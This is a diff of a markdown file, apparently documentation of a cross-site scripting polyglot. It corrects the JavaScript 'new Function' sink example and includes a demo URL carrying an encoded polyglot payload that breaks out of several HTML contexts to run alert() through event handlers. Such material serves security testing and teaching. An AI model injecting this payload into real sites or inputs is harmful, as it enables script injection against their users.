@@ -204,7 +204,7 @@ _Demo: [https://jsbin.com/colese?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/
 * __`Function`:__
 ````javascript
 
-new Function(location.search.slice(1));
+new Function(location.search.slice(1))();
 
 ````
 _Demo: [https://jsbin.com/hizemi?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E](https://jsbin.com/hizemi?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E)_
